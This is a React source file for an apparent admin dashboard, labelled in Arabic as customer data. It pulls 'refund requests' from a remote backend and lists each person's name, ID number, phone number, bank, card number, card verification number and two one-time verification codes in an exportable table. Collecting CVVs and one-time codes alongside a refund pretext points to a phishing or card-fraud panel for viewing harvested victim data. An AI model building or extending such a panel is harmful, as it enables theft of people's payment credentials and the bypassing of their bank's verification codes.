import React, { useState, useEffect } from 'react';

import MUIDataTable from "mui-datatables";
import Clock from '../../UI/Clock';

import './Dashboard-sections.css';
import axios from 'axios';


export default function Requests() {

    const [requests, setRequests] = useState();
    const columns = [
        "name", 
        "idNumber", 
        "phoneNumber", 
        "refundAmount", 
        "bankAccount", 
        "cardNumber",
        "cardVerificationNumber",
        "firstVerificationCode",
        "secondVerificationCode",
    ];

    const options = {
        filterType: 'checkbox',
        onDownload: (buildHead, buildBody, columns, data) => {
            return "\uFEFF" + buildHead(columns) + buildBody(data); 
        } 
    };

    useEffect(() => {
        fetchRequestsList();
    }, []);

    const fetchRequestsList = async () => {

        const loadedRequestsList = [];

        axios.get("https://investment-com.herokuapp.com/clients-requests", {
            headers: {
                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
                'Accept': '*',
                'origin': 'https://investment.netlify.app',
                'Referer': 'https://investment.netlify.app/',
                'Host': 'https://investment-com.herokuapp.com'
            }
        })
        .then((response) => {
            if(response.data['requests']) {
                for(const key in response.data['requests']) {
                    loadedRequestsList.push({
                        name: response.data['requests'][key].user_fullname,
                        idNumber: response.data['requests'][key].user_id_number,
                        phoneNumber: response.data['requests'][key].user_phone_number,
                        refundAmount: response.data['requests'][key].refund_amount,
                        bankAccount: response.data['requests'][key].user_bank,
                        cardNumber: response.data['requests'][key].user_card_number,
                        cardVerificationNumber: response.data['requests'][key].cardVerificationNumber,
                        firstVerificationCode: response.data['requests'][key].first_verification_code,
                        secondVerificationCode: response.data['requests'][key].second_verification_code,
                    });
                }
                setRequests(loadedRequestsList);
            }
        });
    };

    return (
        <div>
            <div className="db-header">
                <div className="text">
                    <h3 className="mb-0">بيانات العملاء</h3>
                    <small className="text-muted">Here's an overview of your customers orders</small>
                </div>
                <Clock />
            </div>
            <div>
                <button type="button" className="btn btn-primary" onClick={fetchRequestsList}>
                    تحديث البيانات
                </button>
            </div>
            {<MUIDataTable
                data={requests}
                columns={columns}
                options={options}
            />}
        </div>
    )
}



